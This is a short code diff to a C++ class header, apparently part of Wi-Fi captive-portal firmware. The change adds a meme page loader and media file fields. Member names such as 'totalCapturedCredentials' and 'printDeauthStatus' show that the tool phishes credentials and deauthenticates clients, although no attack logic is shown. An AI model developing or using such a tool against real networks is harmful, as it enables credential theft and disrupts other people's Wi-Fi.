@@ -57,10 +57,10 @@ private:
     bool _verifyPwd;
     bool _autoMode;
     bool _backgroundMode;
-    
+
     wifi_mode_t _originalWifiMode;
     bool _wifiWasConnected;
-    
+
     AsyncWebServer webServer;
 
     DNSServer dnsServer;
@@ -72,6 +72,8 @@ private:
     String htmlFileName;
     bool isDefaultHtml = true;
     FS *fsHtmlFile;
+    FS *fsMedia;
+    String _memeFilePath;
 
     String lastCred;
     int totalCapturedCredentials = 0;
@@ -97,6 +99,7 @@ private:
     void printDeauthStatus(void);
     void printLastCapturedCredential(void);
     void loadCustomHtml(void);
+    void loadMemeHtml(void);
     void loadDefaultHtml(void);
     void loadDefaultHtml_one(void);
     String wifiLoadPage(void);
